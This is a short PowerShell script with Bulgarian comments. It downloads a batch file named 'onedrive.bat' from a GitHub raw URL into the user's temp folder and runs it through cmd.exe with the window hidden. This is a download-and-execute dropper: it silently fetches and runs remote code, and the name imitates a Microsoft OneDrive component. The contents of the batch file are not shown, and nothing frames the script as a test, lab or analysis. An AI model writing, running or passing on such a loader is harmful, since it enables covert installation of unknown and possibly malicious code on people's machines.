# Сваляне на файла
$url = "https://raw.githubusercontent.com/bgprofil9-create/profejt/refs/heads/main/onedrive.bat"
$tempPath = "$env:TEMP\onedrive.bat"

Invoke-WebRequest -Uri $url -OutFile $tempPath

# Стартиране скрито
Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$tempPath`"" -WindowStyle Hidden -Wait